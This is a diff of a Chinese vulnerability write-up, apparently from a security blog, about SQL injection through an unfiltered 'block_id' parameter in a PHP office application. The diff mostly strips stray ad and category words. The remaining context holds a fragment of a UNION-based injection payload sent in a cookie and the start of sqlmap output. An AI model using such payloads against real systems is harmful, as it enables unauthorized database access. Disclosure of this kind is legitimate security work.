@@ -36,17 +36,7 @@ include_once( "general/new_mytable/content_list/content_".$block_type.".php" );
 ?>
 ```
 
-深入探索
-
-商务软件和生产力软件
-
-数据管理
-
-搜索引擎
-
 `$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
-
-编程
 
 # 漏洞复现
 
@@ -60,17 +50,9 @@ Cookie: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d506862
 
 成功在响应回显测试payload
 
-深入探索
-
-网络
-
-代理
-
-防病毒程序与恶意软件
+编程
 
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
-
-编程
 
 ```
 sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
